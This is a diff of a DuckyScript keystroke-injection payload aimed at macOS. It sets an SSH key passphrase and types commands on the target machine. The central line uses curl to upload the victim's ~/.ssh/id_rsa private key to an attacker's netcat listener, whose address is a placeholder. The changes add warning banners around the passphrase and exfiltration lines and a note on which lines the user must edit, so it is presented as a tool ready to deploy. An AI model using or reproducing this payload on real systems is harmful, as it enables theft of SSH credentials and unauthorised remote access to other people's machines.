@@ -8,6 +8,7 @@ REM  (usage: macOS)
 REM  Here I am defining the commands that I am going to be
 REM  using the most.
 REM  use nc -l PORT to listen
+REM  You will need to change line 25 and 81
 
 REM  you will need to put the ip for the listener and also the passphrase that you
 REM  want ssh to encrypt the id_rsa with.
@@ -20,7 +21,10 @@ DEFINE COUPLE 500
 REM  [Optional] - this is the id_rsa passphrase that will be prompted when joining ssh
 REM  leaving it empty means that there wouldn't be any passphrase needed
 
-DEFINE PASSPHRASE someonewashere  
+REM [!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!]
+DEFINE PASSPHRASE someonewashere 
+REM [!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!]
+
 DEFINE SSHPATH /home/%USERPROFILE%/.ssh/id_rsa
 
 REM   if the delays are too long, then simple change them where it says - DEFINE COUPLE / WHILE / WAIT
@@ -72,7 +76,11 @@ REM  - here we have added our id_rsa to the local ssh keychain (initialization)
 
 ENTER
 DELAY WAIT
+
+REM [!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!]
 STRING curl -F attachment=@/home/%USERPROFILE%/.ssh/id_rsa http://ADD_IP_FOR_NETCAT_HERE_ALSO_PORT
+REM [!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!]
+
 DELAY WHILE
 ENTER
 
@@ -90,4 +98,3 @@ ENTER
 DELAY WAIT
 GUI q
 ENTER
-
